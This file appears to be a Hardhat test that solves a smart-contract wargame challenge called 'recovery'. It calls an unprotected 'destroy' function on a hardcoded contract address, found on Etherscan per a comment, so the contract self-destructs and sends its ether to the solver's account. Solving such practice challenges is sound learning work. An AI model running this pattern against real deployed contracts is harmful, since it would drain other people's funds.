import { ethers } from "hardhat";
import { expect } from "chai";

describe("recovery", function() {
    it("Should solve recovery challenge", async function(){ 
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function destroy(address payable _to) public",
        ]

        /*
         * I found the addres on etherscan.
         * It is really easy in that way, I think challenge author mean some other solution
         * that does not involve etherscan. However, it works. ;)
         */ 
        
        const targetAddr = "0x0285223E36Ebf51A1dfd4B0aCD1C6a75b2Ef9ad4";

        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        let tx = await targetCont.destroy(eoa.address);
        await tx.wait();
        console.log(tx);

    });
});